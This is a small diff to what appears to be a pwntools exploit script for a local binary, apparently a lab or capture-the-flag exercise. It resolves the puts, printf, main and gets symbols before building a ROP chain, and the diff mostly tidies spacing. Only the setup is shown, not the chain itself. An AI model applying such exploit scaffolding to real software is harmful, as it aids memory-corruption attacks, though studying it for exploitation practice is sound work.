@@ -5,13 +5,11 @@ BUFFER_LEN = 120
 e = ELF("./myapp")
 p = process(e.path)
 
-#Searching symbols on the binary
-puts  = e.symbols[b"puts"]
+# Searching symbols on the binary
+puts    = e.symbols[b"puts"]
 printf  = e.symbols[b"printf"]
 main    = e.symbols[b"main"]
-gets   = e.symbols[b"gets"]
-stdin   = e.symbols[b"_IO_stdin_used"]
-buffer_mem = 0x00404038 #.data
+gets    = e.symbols[b"gets"]
 
 # Chain #1
 print("[!] ROP Chain #1")
